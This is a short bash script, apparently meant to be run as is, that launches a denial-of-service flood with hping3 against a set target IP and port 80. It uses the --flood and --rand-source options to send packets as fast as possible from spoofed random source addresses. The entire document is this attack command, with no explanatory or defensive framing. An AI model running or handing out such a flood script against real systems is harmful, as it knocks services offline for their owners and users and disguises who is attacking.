#!/bin/bash

TARGET_IP="10.0.0.2"
TARGET_PORT="80"

hping3 --flood --rand-source -p $TARGET_PORT $TARGET_IP
